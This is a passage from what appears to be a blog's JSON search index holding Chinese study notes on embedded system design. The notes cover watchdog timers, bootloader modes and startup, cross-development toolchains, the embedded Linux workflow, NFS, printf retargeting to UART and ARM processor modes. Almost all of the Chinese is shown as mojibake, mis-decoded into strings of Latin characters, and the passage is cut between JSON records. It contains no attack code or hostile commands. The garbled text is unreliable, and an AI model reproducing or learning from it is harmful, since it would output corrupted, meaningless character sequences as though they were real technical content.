æ•´ä¸ªç³»ç»Ÿæä¾›åŒæ­¥è„‰å†²ï¼Œåƒäººçš„è„‰æä¸€æ ·ã€‚ çœ‹é—¨ç‹—ï¼šå…¶å®æ˜¯ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå½“å®ƒè®¡æ•°æº¢å‡ºçš„æ—¶å€™ï¼Œä¼šä½¿ç³»ç»Ÿå¤ä½ï¼Œæ‰€ä»¥å®ƒçš„ä½œç”¨æ˜¯é˜²æ­¢ç³»ç»Ÿæ­»æœºã€‚æ‰“å¼€çœ‹é—¨ç‹—ä¹‹åï¼Œå½“ä»£ç è·‘é£æˆ–è€…é™·å…¥æ­»å¾ªç¯ä¹‹åï¼Œå°±ä¸èƒ½å–‚ç‹—ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½æ¸…é™¤è®¡æ•°å€¼ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šä½¿ç³»ç»Ÿé‡å¯ã€‚ VIVI ä»€ä¹ˆæ˜¯bootloader Bootloaderï¼Œä¸ºå¼•å¯¼åŠ è½½ç¨‹åºï¼Œæ˜¯åµŒå…¥å¼ç³»ç»ŸåŠ ç”µåè¿è¡Œçš„ç¬¬ä¸€æ®µä»£ç ï¼Œç›¸å½“äºPCæœºçš„BIOSã€‚ Bootloaderåœ¨ç³»ç»Ÿä¸­çš„ä½ç½®ï¼š é€šå¸¸å›ºåŒ–åœ¨ç¡¬ä»¶ä¸Šçš„æŸä¸ªå›ºæ€å­˜å‚¨è®¾å¤‡ä¸Šï¼ŒåŠ ç”µåè‡ªå¯åŠ¨ã€‚\nBootloaderåŠŸèƒ½ï¼š åˆå§‹åŒ–ï¼Œç»™CPUåˆé€‚çš„å·¥ä½œç¯å¢ƒï¼ˆç›¸å½“äºSTARTUP.Sï¼‰ï¼Œä»¥ä¾¿ä¸ºæœ€ç»ˆè°ƒç”¨æ“ä½œç³»ç»Ÿå†…æ ¸æˆ–ç”¨æˆ·åº”ç”¨ç¨‹åºå¢ƒã€‚åŠ è½½å†…æ ¸ï¼Œä¸‹è½½å†…æ ¸æˆ–è€…æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚\nBootloaderæ“ä½œæ¨¡å¼ æœ‰å¯åŠ¨åŠ è½½å’Œä¸‹è½½ä¸¤ç§æ¨¡å¼ã€‚\nå¯åŠ¨åŠ è½½æ¨¡å¼æ˜¯Bootloaderçš„æ­£å¸¸å·¥ä½œæ¨¡å¼ï¼Œåœ¨åµŒå…¥å¼äº§å“å‘å¸ƒçš„æ—¶ä¾¯ï¼ŒBootloaderå¿…é¡»å·¥ä½œåœ¨è¿™ç§æ¨¡å¼ä¸‹ã€‚å³åˆå§‹åŒ–CPUçš„å·¥ä½œç¯å¢ƒä¹‹åï¼Œå°†å†…æ ¸å¦‚RAMæ‰§è¡Œã€‚ ä¸‹è½½æ¨¡å¼ï¼šç›®æ ‡æœºä¸Šçš„Bootloaderå°†é€šè¿‡ä¸²å£è¿æ¥æˆ–ç½‘ç»œè¿æ¥ç­‰é€šä¿¡æ‰‹æ®µä»ä¸»æœºä¸‹è½½æ–‡ä»¶ã€‚ä¸»è¦æ˜¯ä¸‹è½½å†…æ ¸æ˜ åƒå’Œæ ¹æ–‡ä»¶ç³»ç»Ÿæ˜ åƒç­‰ã€‚ä»ä¸»æœºä¸‹è½½çš„æ–‡ä»¶é€šå¸¸é¦–å…ˆè¢«Bootloaderä¿å­˜åˆ°ç›®æ ‡æœºçš„RAMä¸­ï¼Œç„¶åå†è¢«Bootloaderå†™åˆ°ç›®æ ‡æœºä¸Šçš„FLASHç±»å›ºæ€å­˜å‚¨è®¾å¤‡ä¸­ã€‚Bootloaderçš„è¿™ç§æ¨¡å¼é€šå¸¸åœ¨ç¬¬ä¸€æ¬¡å®‰è£…å†…æ ¸ä¸æ ¹æ–‡ä»¶ç³»ç»Ÿæ—¶è¢«ä½¿ç”¨ï¼›æ­¤å¤–ï¼Œä»¥åçš„ç³»ç»Ÿæ›´æ–°ä¹Ÿä¼šä½¿ç”¨åˆ°è¿™ç§å·¥ä½œæ¨¡å¼ã€‚ Bootloaderå¯åŠ¨è¿‡ç¨‹ ä¸Šç”µä¹‹åï¼Œå…ˆå¯åŠ¨CPUå³æ‰§è¡Œstartup.sç±»ä¼¼åŠŸèƒ½ä»£ç ï¼ˆé…ç½®ä¸­æ–­ã€åˆå§‹åŒ–å †æ ˆã€æ‹·è´ä»£ç ç­‰ï¼‰ï¼Œç„¶åè¿›è¡ŒåŠ è½½å†…æ ¸çš„å‡†å¤‡è‡³å°‘åˆå§‹åŒ–ä¸€ä¸ªä¸²å£ï¼Œä»¥ä¾¿å‘ç»ˆç«¯ç”¨æˆ·åé¦ˆæ•°æ®ã€‚æ£€æµ‹ç³»ç»Ÿå†…å­˜æ˜ å°„ï¼Œå“ªäº›æ˜¯å¯ç”¨çš„RAMï¼Ÿåœ¨è¿™ä¸€æ­¥ä¹‹åï¼Œå°†æ£€æµ‹å¤–éƒ¨æŒ‰é”®ï¼Œæœ‰æŒ‰é”®æŒ‰ä¸‹å°†è¿›å…¥ä¸‹è½½æ¨¡å¼ï¼Œæ²¡æœ‰æŒ‰é”®çš„è¯å°†æ‰§è¡Œä¸‹é¢çš„æ­¥éª¤ï¼ŒåŠ è½½å†…æ ¸ï¼š\nå°†kenelå’Œæ ¹æ–‡ä»¶ç³»ç»Ÿä»flashè°ƒå…¥RAM ä¸ºå†…æ ¸å¯åŠ¨è®¾ç½®å‚æ•° è°ƒç”¨å†…æ ¸ã€‚ ","date":1470056667,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1470056667,"objectID":"9422ce250458909ca296253c177da62a","permalink":"http://www.guozet.me/post/Linux-Embedded-System-Design/","publishdate":"2016-08-01T13:04:27Z","relpermalink":"/post/Linux-Embedded-System-Design/","section":"post","summary":"ã€ŠåµŒå…¥å¼ç³»ç»Ÿè®¾è®¡ã€‹æ¦‚è¿° å‰è¨€ è¿™æ˜¯ã€ŠåµŒå…¥å¼ç³»ç»Ÿè®¾è®¡ã€‹è¿™æœ¬ä¹¦ç±çš„å†…","tags":"Linux kernel","title":"åµŒå…¥å¼ç³»ç»Ÿè®¾è®¡è¯¾ç¨‹","type":"post"},{"authors":null,"categories":"Linux","content":"ã€ŠåµŒå…¥å¼ç³»ç»Ÿè®¾è®¡ã€‹æ¦‚è¿°\nå‰è¨€ è¿™æ˜¯ã€ŠåµŒå…¥å¼ç³»ç»Ÿè®¾è®¡ã€‹è¿™æœ¬ä¹¦ç±çš„å†…å®¹å°ç»“ï¼Œä¸»è¦ä»‹ç»äº†åµŒå…¥å¼ç³»ç»Ÿæ¶æ„ä¸­çš„ç³»ç»Ÿéƒ¨åˆ†ã€‚\nä¹¦ç±å†…å®¹å°ç»“æ‘˜è¦ åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ä»‹ç»ï¼š\nåµŒå…¥å¼ç³»ç»Ÿè®¾è®¡éƒ¨åˆ†ï¼šARMæ¶æ„éƒ¨åˆ† åµŒå…¥å¼ç³»ç»Ÿè®¾è®¡éƒ¨åˆ† åµŒå…¥å¼ç³»ç»Ÿçš„å®šä¹‰ ä»¥åº”ç”¨ä¸ºä¸­å¿ƒã€ä»¥è®¡ç®—æœºæŠ€æœ¯ä¸ºåŸºç¡€ã€è½¯ç¡¬ä»¶å¯è£å‰ªã€é€‚åº”åº”ç”¨ç³»ç»Ÿå¯¹åŠŸèƒ½ã€å¯é æ€§ã€æˆæœ¬ã€ä½“ç§¯ã€åŠŸè€—ä¸¥æ ¼è¦æ±‚çš„ä¸“ç”¨è®¡ç®—æœºç³»ç»Ÿã€‚â€œåµŒå…¥â€ã€â€œä¸“ç”¨â€ã€â€œè®¡ç®—æœºâ€\nåµŒå…¥å¼ç³»ç»Ÿçš„è½¯ã€ç¡¬ä»¶ç»„æˆï¼Ÿä»¥åŠä¸»è¦ç‰¹ç‚¹ï¼Ÿ è½¯ä»¶ï¼šä»åº•å±‚åˆ°ä¸Šå±‚ï¼šbootloaderç­‰ç³»ç»Ÿåˆå§‹åŒ–å¼•å¯¼ç¨‹åºã€è®¾å¤‡é©±åŠ¨å±‚ï¼ˆåŒ…æ‹¬é©±åŠ¨ç¨‹åºã€æ¿çº§æ”¯æŒåŒ…BSPç­‰ï¼‰ã€æ“ä½œç³»ç»Ÿã€ç”¨æˆ·åº”ç”¨ç¨‹åºã€‚ï¼ˆåº•å±‚ä¸ºä¸Šå±‚æä¾›æœåŠ¡ï¼‰ å¼€å‘è½¯ä»¶ï¼šå³é›†æˆå¼€å‘ç¯å¢ƒï¼ˆasemmbler\u0026amp;\u0026amp;compiler\u0026amp;\u0026amp;linker\u0026amp;\u0026amp;debugger\u0026amp;\u0026amp;loaderï¼‰ ç¡¬ä»¶ç»„æˆï¼šæ ¸å¿ƒæ¿+å¤–å›´æ¿+å¤–è®¾(æ ¸å¿ƒæ¿ï¼šå¾®æ§åˆ¶å™¨ï¼ˆCPUå’Œå¤–è®¾æ¥å£ã€å¤–è®¾æ§åˆ¶å™¨ï¼‰ã€ç”µæºã€æ—¶é’Ÿã€å¤ä½ã€SDRAMã€flashã€‚å¤–å›´æ¿é¢å‘å¤–å›´è®¾å¤‡ï¼Œä¸€èˆ¬æ˜¯å¼•è„šçš„é›†åˆã€ç”µå¹³è½¬æ¢ç”µè·¯ã€‚å¤–å›´è®¾å¤‡ã€‚)ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å°†æ ¸å¿ƒæ¿å’Œå¤–å›´æ¿æ”¾åœ¨ä¸€èµ·ã€‚ ç¡¬ä»¶ç‰¹ç‚¹ï¼šé€šå¸¸ç”±åµŒå…¥å¼å¤„ç†å™¨å’ŒåµŒå…¥å¼å¤–å›´è®¾å¤‡ç»„æˆï¼Œé«˜åº¦é›†æˆï¼Œå¸¸é‡‡ç”¨SOCè®¾è®¡æ–¹æ³•ï¼Œå¯¹åŠŸè€—ã€ä½“ç§¯ç­‰æœ‰ä¸¥æ ¼è¦æ±‚ï¼Œå®šåˆ¶æ€§å†³å®šäº†å®ƒçš„å¯è£å‰ªæ€§ï¼Œæ²¡æœ‰åƒè®¡ç®—æœºé¢†åŸŸçš„å„æ–­ï¼Œè§£å†³æ–¹æ¡ˆä¸å”¯ä¸€ã€‚ è½¯ä»¶ç‰¹ç‚¹ï¼šé‡‡ç”¨äº¤å‰å¼€å‘æ–¹å¼ï¼Œç³»ç»Ÿè½¯ä»¶å±‚æ¬¡åˆ†æ˜ï¼Œæ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·ç¨‹åºæä¾›æ ‡å‡†APIï¼Œæä¾›å›¾å½¢æ¥å£å’Œæ–‡ä»¶ç³»ç»Ÿã€‚ç”¨æˆ·è°ƒç”¨ç³»ç»ŸæœåŠ¡ï¼Œç³»ç»Ÿè°ƒç”¨è®¾å¤‡é©±åŠ¨ä»è€Œæ“çºµç¡¬ä»¶ã€‚ åµŒå…¥å¼ç³»ç»Ÿäº§å“è®¾è®¡çš„åŸºæœ¬æµç¨‹ï¼Ÿ éœ€æ±‚åˆ†æï¼š\nåŠŸèƒ½æ€§éœ€æ±‚æ˜¯ç³»ç»Ÿçš„åŸºæœ¬åŠŸèƒ½ï¼Œå¦‚è¾“å…¥è¾“å‡ºä¿¡å·ã€æ“ä½œæ–¹å¼ç­‰ï¼› éåŠŸèƒ½æ€§éœ€æ±‚åŒ…æ‹¬ç³»ç»Ÿæ€§èƒ½ã€æˆæœ¬ã€åŠŸè€—ã€ä½“ç§¯ã€é‡é‡ç­‰å› ç´ ã€‚ è§„æ ¼è¯´æ˜ï¼šç²¾ç¡®åœ°åæ˜ å®¢æˆ·çš„éœ€æ±‚å¹¶ä¸”ä½œä¸ºè®¾è®¡æ—¶å¿…é¡»æ˜ç¡®éµå¾ªçš„è¦æ±‚ã€‚\nä½“ç³»ç»“æ„è®¾è®¡ï¼šæè¿°ç³»ç»Ÿå¦‚ä½•å®ç°æ‰€è¿°çš„åŠŸèƒ½å’ŒéåŠŸèƒ½éœ€æ±‚ï¼ŒåŒ…æ‹¬å¯¹ç¡¬ä»¶ã€è½¯ä»¶å’Œæ‰§è¡Œè£…ç½®çš„åŠŸèƒ½åˆ’åˆ†ä»¥åŠç³»ç»Ÿçš„è½¯ä»¶ã€ç¡¬ä»¶é€‰å‹ç­‰ã€‚\nè½¯ç¡¬ä»¶è®¾è®¡ï¼šåŸºäºä½“ç³»ç»“æ„ï¼Œå¯¹ç³»ç»Ÿçš„è½¯ä»¶ã€ç¡¬ä»¶è¿›è¡Œè¯¦ç»†è®¾è®¡ã€‚\nç³»ç»Ÿé›†æˆï¼šæŠŠç³»ç»Ÿçš„è½¯ä»¶ã€ç¡¬ä»¶å’Œæ‰§è¡Œè£…ç½®é›†æˆåœ¨ä¸€èµ·ï¼Œè¿›è¡Œè°ƒè¯•ï¼Œå‘ç°å¹¶æ”¹è¿›å•å…ƒè®¾è®¡è¿‡ç¨‹ä¸­çš„é”™è¯¯ã€‚\nç³»ç»Ÿæµ‹è¯•ï¼šå¯¹è®¾è®¡å¥½çš„ç³»ç»Ÿè¿›è¡Œæµ‹è¯•ï¼Œçœ‹å…¶æ˜¯å¦æ»¡è¶³è§„æ ¼è¯´æ˜ä¹¦ä¸­ç»™å®šçš„åŠŸèƒ½è¦æ±‚ã€‚\nå¤„ç†å™¨åŠæ“ä½œç³»ç»Ÿçš„é€‰å‹ä¸»è¦è€ƒè™‘å“ªäº›æ–¹é¢ï¼Ÿ æ“ä½œç³»ç»Ÿæœ¬èº«æ‰€æä¾›çš„å¼€å‘å·¥å…·ã€‚ æ“ä½œç³»ç»Ÿå‘ç¡¬ä»¶æ¥å£ç§»æ¤éš¾åº¦ã€‚ æ“ä½œç³»ç»Ÿçš„å†…å­˜è¦æ±‚ã€‚ å¼€å‘äººå‘˜æ˜¯å¦ç†Ÿæ‚‰æ­¤æ“ä½œç³»ç»ŸåŠå…¶æä¾›çš„ç³»ç»ŸAPIã€‚ æ“ä½œç³»ç»Ÿæ˜¯å¦æä¾›ç¡¬ä»¶çš„é©±åŠ¨ç¨‹åºï¼Œå¦‚ç½‘å¡é©±åŠ¨ç¨‹åºç­‰ã€‚ æ“ä½œç³»ç»Ÿçš„æ˜¯å¦å…·æœ‰å¯å‰ªè£æ€§ã€‚ æ“ä½œç³»ç»Ÿæ˜¯å¦å…·æœ‰å®æ—¶æ€§èƒ½ã€‚ äº¤å‰å¼€å‘ã€äº¤å‰å¼€å‘ç¯å¢ƒï¼Ÿä¸ºä½•éœ€è¦äº¤å‰å¼€å‘ç¯å¢ƒï¼Ÿ äº¤å‰å¼€å‘æ˜¯æŒ‡åœ¨ä¸€å°é€šç”¨è®¡ç®—æœºï¼ˆå®¿ä¸»æœºï¼‰ä¸Šè¿›è¡Œè½¯ä»¶çš„ç¼–è¾‘ç¼–è¯‘ï¼Œç„¶åä¸‹è½½åˆ°åµŒå…¥å¼è®¾å¤‡ï¼ˆç›®æ ‡æœºï¼‰ä¸­è¿è¡Œè°ƒè¯•çš„å¼€å‘æ–¹å¼\näº¤å‰å¼€å‘ç¯å¢ƒä¸€èˆ¬ç”±è¿è¡Œäºå®¿ä¸»æœºä¸Šçš„äº¤å‰å¼€å‘è½¯ä»¶ï¼ˆassembler\u0026amp;\u0026amp;compiler\u0026amp;\u0026amp;linker\u0026amp;\u0026amp;debugger\u0026amp;\u0026amp;loaderï¼‰ã€å®¿ä¸»æœºåˆ°ç›®æ ‡æœºçš„è°ƒè¯•é€šé“ç»„æˆ\néœ€è¦äº¤å‰å¼€å‘ç¯å¢ƒæ˜¯å› ä¸ºç›®æ ‡æœºä¸€èˆ¬å¯¹ä½“ç§¯ã€åŠŸè€—ç­‰æœ‰ä¸¥æ ¼é™åˆ¶ï¼Œèµ„æºä¹Ÿé¢å‘åº”ç”¨ï¼Œè¾ƒä¸ºç´§å¼ ï¼Œè¦æ±‚ä»…ä»…èƒ½æµç•…è¿è¡Œä»£ç å³å¯ï¼Œè€Œå°†ç”¨æˆ·å¼€å‘è½¯ä»¶ï¼ˆåŒ…æ‹¬å„ç§åº“ã€å·¥å…·ï¼‰æ”¾ç½®åœ¨ä¸»æœºä¸Šï¼Œè€Œä¸”ç°åœ¨çš„é›†æˆå¼€å‘ç¯å¢ƒæä¾›äº†å„ç§ä¿®æ”¹å¥½çš„åŠŸèƒ½åº“ï¼Œç”¨èµ·æ¥ä¹Ÿæ–¹ä¾¿ã€‚\nåµŒå…¥å¼é›†æˆå¼€å‘ç¯å¢ƒçš„ä¸»è¦åŠŸèƒ½ï¼Ÿ è¿™æ˜¯ç”±å…¶ç»„æˆå†³å®šçš„ã€‚Assemblerå°†.cæºä»£ç æ±‡ç¼–ï¼Œcompilerå½¢æˆç›®æ ‡æ–‡ä»¶ï¼Œlinkeræ ¹æ®é“¾æ¥æè¿°æ–‡ä»¶å°†å„ä¸ªç›®æ ‡ä»£ç é“¾æ¥å®šä½ç”Ÿæˆå¯æ‰§è¡Œä»£ç ã€‚Debuggeræœ‰äº›äº¤å‰å¼€å‘å·¥å…·æä¾›äº†ä»¿çœŸè°ƒè¯•é€šé“ã€‚Loaderå¯ä»¥å°†ç›®æ ‡æ–‡ä»¶çƒ§å½•è¿›è®¾å¤‡ä¸­ï¼ˆæœ‰æ—¶éœ€è¦å†…éƒ¨å¼•å¯¼ä»£ç çš„é…åˆï¼‰\nåµŒå…¥å¼Linux å¼€å‘ä¸»è¦æµç¨‹ï¼Ÿ æ­å»ºå¼€å‘ç¯å¢ƒâ€“çƒ§å†™bootloaderâ€“çƒ§å†™å†…æ ¸â€“çƒ§å†™æ ¹æ–‡ä»¶ç³»ç»Ÿâ€“çƒ§å†™åº”ç”¨ç¨‹åºã€‚\nå¼€å‘ç¯å¢ƒï¼šREDHATï¼LINUXã€ä¸‹è½½ç›¸åº”çš„GCC äº¤å‰ç¼–è¯‘å™¨è¿›è¡Œå®‰è£…ã€é…ç½®å¼€å‘ä¸»æœºï¼ˆé…ç½®MINICOMå’Œé…ç½®ç½‘ç»œï¼ŒMINICOM è½¯ä»¶çš„ä½œç”¨æ˜¯ä½œä¸ºè°ƒè¯•åµŒå…¥å¼å¼€å‘æ¿ä¿¡æ¯è¾“å‡ºçš„ç›‘è§†å™¨å’Œé”®ç›˜è¾“å…¥çš„å·¥å…·ï¼Œé…ç½®ç½‘ç»œä¸»è¦æ˜¯é…ç½®IPåœ°å€ã€NFSç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œéœ€è¦å…³é—­é˜²ç«å¢™ï¼‰\nçƒ§å†™bootloaderï¼šä¸‹è½½ä¸€äº›å…¬å¼€æºä»£ç çš„BOOTLOADERæ ¹æ®è‡ªå·±å…·ä½“èŠ¯ç‰‡è¿›è¡Œç§»æ¤ä¿®æ”¹ã€‚ æ³¨ï¼šä¸‹è½½æ—¶ï¼Œæœ‰äº›èŠ¯ç‰‡æ²¡æœ‰å†…ç½®å¼•å¯¼è£…è½½ç¨‹åºï¼Œæ¯”å¦‚ä¸‰æ˜Ÿçš„ARM7ã€ARM9ç³»åˆ—èŠ¯ç‰‡ï¼Œè¿™æ ·å°±éœ€è¦ç¼–å†™çƒ§å†™å¼€å‘æ¿ä¸Šflash çš„çƒ§å†™ç¨‹åºã€‚æˆ–è€…ç½‘ç»œä¸Šæœ‰å…è´¹ä¸‹è½½çš„WINDOWS ä¸‹é€šè¿‡JTAG å¹¶å£ç®€æ˜“ä»¿çœŸå™¨çƒ§å†™ARM å¤–å›´flashèŠ¯ç‰‡çš„ç¨‹åºã€‚ä¹Ÿæœ‰LINUX ä¸‹å…¬å¼€æºä»£ç çš„J-FLASH ç¨‹åºã€‚\nä¸‹è½½å†…æ ¸ï¼šå¦‚æœæœ‰ä¸“é—¨é’ˆå¯¹ä½ æ‰€ä½¿ç”¨çš„CPU ç§»æ¤å¥½çš„LINUX æ“ä½œç³»ç»Ÿé‚£æ˜¯å†å¥½ä¸è¿‡ï¼Œä¸‹è½½åå†æ·»åŠ è‡ªå·±çš„ç‰¹å®šç¡¬ä»¶çš„é©±åŠ¨ç¨‹åºï¼Œè¿›è¡Œè°ƒè¯•ä¿®æ”¹ã€‚\nä¸‹è½½æ ¹æ–‡ä»¶ç³»ç»Ÿï¼šä»www.busybox.net ä¸‹è½½ä½¿ç”¨BUSYBOXè½¯ä»¶è¿›è¡ŒåŠŸèƒ½è£å‡ï¼Œäº§ç”Ÿä¸€ä¸ªæœ€åŸºæœ¬çš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚æ ¹æ–‡ä»¶ç³»ç»Ÿåœ¨åµŒå…¥å¼ç³»ç»Ÿä¸­ä¸€èˆ¬è®¾ä¸ºåªè¯»ï¼Œéœ€è¦ä½¿ç”¨mkcramfsã€genromfs ç­‰å·¥å…·äº§ç”Ÿçƒ§å†™æ˜ è±¡æ–‡ä»¶ã€‚\næ–‡ä»¶ç³»ç»Ÿå°±æ˜¯æŠŠä½ ç¡¬ç›˜ä¸Šæ•°æ®æŒ‰ç…§ä¸€å®šæ ¼å¼ç»„ç»‡æˆä¸€æ£µæ ‘ã€‚æ•°æ®å—å¯¹åº”åç§°ã€‚åˆ äº†å®ƒå°±ç›¸å½“äºæŠŠç¡¬ç›˜æ ¼å¼åŒ–äº†ã€‚æ ¹æ–‡ä»¶ç³»ç»Ÿå°±æ˜¯å‡ºäº†å†…æ ¸ä»¥å¤–ï¼Œæ‰€æœ‰çš„ç³»ç»Ÿæ–‡ä»¶å­˜å‚¨çš„åœ°æ–¹ã€‚ä¹‹æ‰€ä»¥æˆä¸ºæ ¹ï¼Œæ˜¯å› ä¸ºæœ‰æ ¹æ‰èƒ½æˆç”Ÿé•¿æˆæ ‘ï¼Œæ˜¯å…¶å®ƒæ–‡ä»¶çš„æœ€ç»ˆæŒ‚è½½ç‚¹ã€‚æˆ‘ä»¬è¦æ˜ç™½æ ¹æ–‡ä»¶ç³»ç»Ÿå’Œå†…æ ¸æ˜¯å®Œå…¨ç‹¬ç«‹çš„ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå®ƒæ˜¯å†…æ ¸å¯åŠ¨æ—¶æ‰€mountçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œé‡Œé¢æœ‰å†…æ ¸å¯åŠ¨æ‰€å¿…é¡»çš„æ•°æ®ï¼Œä¸ç„¶å°±é€€å‡ºå¯åŠ¨æ–‡ä»¶ç³»ç»Ÿè¿™ç§æœºåˆ¶æœ‰åˆ©äºç”¨æˆ·å’Œæ“ä½œç³»ç»Ÿçš„äº¤äº’ã€‚æ•°æ®å—å¯¹åº”åç§°ã€‚å°½ç®¡å†…æ ¸æ˜¯Linux çš„æ ¸å¿ƒï¼Œä½†æ–‡ä»¶å´æ˜¯ç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿäº¤äº’æ‰€é‡‡ç”¨çš„ä¸»è¦å·¥å…·ï¼Œå°¤å…¶æ˜¯LINUXã€‚\nä¸‹è½½ç”¨æˆ·ç¨‹åº:å¯ä»¥ä¸‹è½½åˆ°æ ¹æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæœ‰çš„åº”ç”¨ç¨‹åºä¸ä½¿ç”¨æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ˜¯ç›´æ¥å°†åº”ç”¨ç¨‹åºå’Œå†…æ ¸è®¾è®¡åœ¨ä¸€èµ·ï¼Œè¿™æœ‰ç‚¹ç±»ä¼¼äºUCOS-IIçš„æ–¹å¼ã€‚\nåµŒå…¥å¼Linux å¼€å‘ç¯å¢ƒä¸­é…ç½®NFSæœåŠ¡çš„ç›®çš„ï¼Ÿ å¯ä»¥ä½¿ä¸åŒæœºå™¨ã€ä¸åŒæ“ä½œç³»ç»Ÿä¹‹é—´é€šè¿‡ç½‘ç»œå…±äº«æ–‡ä»¶ï¼Œåƒè®¿é—®æœ¬åœ°æ–‡ä»¶ä¸€æ ·è®¿é—®è¿œç«¯ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ï¼Œåœ¨å¼€å‘é˜¶æ®µï¼Œä¸»æœºåˆ¶ä½œåŸºäºNFSçš„æ–‡ä»¶ç³»ç»Ÿï¼Œåˆ¶å®šå¼€æ”¾ç›®å½•ï¼Œå¼€æ”¾å¯¹è±¡çš„IPèŒƒå›´ï¼Œå°†ç›®å½•æŒ‚è½½åˆ°åµŒå…¥å¼è®¾å¤‡åï¼ŒåµŒå…¥å¼è®¾å¤‡å¯ä»¥æ–¹ä¾¿åœ°è®¿é—®ã€ä¿®æ”¹ä¸»æœºä¸»æœºæ–‡ä»¶ã€‚\nä»€ä¹ˆæ˜¯ç¡¬ä»¶é‡å®šå‘ï¼Ÿ ä¸Šè¯¾çš„è€å¸ˆä¸¾å¾—printfï¼ˆï¼‰æ˜¯ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œé‡å®šå‘ç¨‹åºæ˜¯é¢å‘ç¼–è¯‘ç¯å¢ƒä¸­çš„è¿æ¥å™¨çš„ï¼Œæ˜¯ç”¨æˆ·è‡ªå·±å®šä¹‰çš„Cåº“å‡½æ•°ï¼Œæœ‰äº†å®ƒï¼Œåœ¨ç¨‹åºè¿æ¥æ—¶è¿æ¥å™¨ä¼šè¿æ¥ç”¨æˆ·è‡ªå·±ç¼–å†™çš„Cåº“ä¸­çš„åŠŸèƒ½å‡½æ•°è€Œä¸æ˜¯æ ‡å‡†Cåº“ã€‚ç›¸å½“äºå°†æ ‡å‡†Cåº“è¿›è¡Œäº†ä¸€æ¬¡ç§»æ¤ã€‚ä»ä¸»æœºç¯å¢ƒåˆ°å®é™…è¿è¡Œç¯å¢ƒçš„ç§»æ¤ã€‚\næ¯”å¦‚ï¼šæœ¬æ¥åº“å‡½æ•°fputc()æ˜¯æŠŠå­—ç¬¦è¾“å‡ºåˆ°è°ƒè¯•å™¨æ§åˆ¶çª—å£ä¸­å»çš„,ä½†ç”¨æˆ·æŠŠè¾“å‡ºè®¾å¤‡æ”¹æˆäº†UARTç«¯å£,è¿™æ ·ä¸€æ¥,æ‰€æœ‰åŸºäºfputc()å‡½æ•°çš„printf()ç³»åˆ—å‡½æ•°è¾“å‡ºéƒ½è¢«é‡å®šå‘åˆ°UARTç«¯å£ä¸Šå»äº†ã€‚ç›¸å½“äºå®ç°ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†æ˜¯åº•å±‚çš„é©±åŠ¨å˜äº†ã€‚\nARMä½“ç³»ç»“æ„éƒ¨åˆ† ARMç¡¬ä»¶ç”µè·¯æœ€å°ç³»ç»Ÿç»„æˆï¼Ÿ å¾®æ§åˆ¶å™¨ï¼ˆä¾‹å¦‚2410ï¼ŒCPU+å¤–è®¾æ¥å£/å¤–è®¾æ§åˆ¶å™¨ï¼‰ç”µæºã€æ—¶é’Ÿã€å¤ä½ã€å­˜å‚¨å™¨ï¼ˆSDRAM/FLASHï¼ˆNOR8ä½ã€NAND8 16 32ä½ï¼‰ï¼‰ FLASHï¼šå­˜æ”¾æ“ä½œç³»ç»Ÿã€ç”¨æˆ·ç¨‹åºç­‰éœ€è¦æ‰ç”µåä¿å­˜çš„æ•°æ® SDRAMï¼šç³»ç»Ÿè¿è¡Œçš„ä¸»è¦åŒºåŸŸï¼Œç³»ç»ŸåŠç”¨æˆ·æ•°æ®åŠå †æ ˆï¼Œéƒ½åœ¨è¿™ä¸ªåŒºåŸŸã€‚æœ‰æ—¶å¯åŠ¨æ¨¡å¼é€‰æ‹© æœ‰æ—¶éœ€è¦JTAGï¼šå¯¹èŠ¯ç‰‡å†…æ‰€æœ‰éƒ¨ä»¶è¿›è¡Œè®¿é—®ï¼Œé€šè¿‡è¯¥æ¥å£å¯¹ç³»ç»Ÿè°ƒè¯•ã€ç¼–ç¨‹ ARMå¤„ç†å™¨çš„ä¸»è¦å·¥ä½œæ¨¡å¼ï¼Ÿ ARMçš„7ç§å¤„ç†å™¨æ¨¡å¼ï¼ˆä¸åŒçš„æ¨¡å¼ä¸‹æœ‰è‡ªå·±çš„è¡Œä¸ºå‡†åˆ™ï¼‰\nUSRï¼›æ­£å¸¸ç¨‹åºæ‰§è¡Œæ¨¡å¼ FIQï¼›æ”¯æŒé«˜é€Ÿæ•°æ®ä¼ é€å’Œé€šé“å¤„ç† IRQï¼›ç”¨äºé€šç”¨ä¸­æ–­çš„å¤„ç†ã€‚ ç®¡ç†ï¼ˆSVCï¼‰ï¼›æ“ä½œç³»ç»Ÿä¿æŠ¤æ¨¡å¼ ä¸­æ­¢ æœªå®šä¹‰ ç³»ç»Ÿ é™¤äº†USRä¹‹å¤–ï¼Œå…¶å®ƒ6ç§åˆç§°ä¸ºç‰¹æƒæ¨¡å¼ã€‚6ä¸­ç§é™¤äº†ç³»ç»Ÿæ¨¡å¼åˆç§°ä¸ºå¼‚å¸¸æ¨¡å¼ï¼ˆå³å¤„ç†å¼‚å¸¸æ—¶çš„å·¥ä½œæ¨¡å¼ï¼‰ã€‚\nåœ¨è½¯ä»¶æ§åˆ¶ä¸‹å¯ä»¥æ”¹å˜æ¨¡å¼ï¼ˆå³æ”¹å˜CPSRç›¸åº”ï¼‰ï¼Œå¤–éƒ¨ä¸­æ–­æˆ–å¼‚å¸¸å¤„ç†ä¹Ÿå¼•èµ·æ¨¡å¼å˜åŒ–ï¼Œç”¨æˆ·æ¨¡å¼ä¸‹ä¸èƒ½æ”¹å˜æ¨¡å¼ã€‚\næ ¸å¿ƒå¯„å­˜å™¨çš„ä½œç”¨ï¼š R13é€šå¸¸ç”¨ä½œå †æ 